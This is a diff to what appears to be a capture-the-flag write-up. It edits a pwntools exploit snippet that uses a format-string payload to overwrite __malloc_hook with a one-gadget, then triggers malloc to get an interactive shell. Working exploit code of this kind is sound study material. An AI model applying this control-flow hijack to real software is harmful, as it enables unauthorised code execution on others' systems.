@@ -137,7 +137,7 @@ With libc location known, all that is left is to _hook the malloc_:
 
 ```python
 p.sendlineafter('point\n',fmtstr_payload(6,{libc.sym.__malloc_hook:libc.sym.gadget},write_size='short'))
-p.sendlineafter('point\n','%65537c')
+p.sendlineafter('point\n','%65536c')
 p.recvuntil('entered\n')
 p.interactive()
 ```
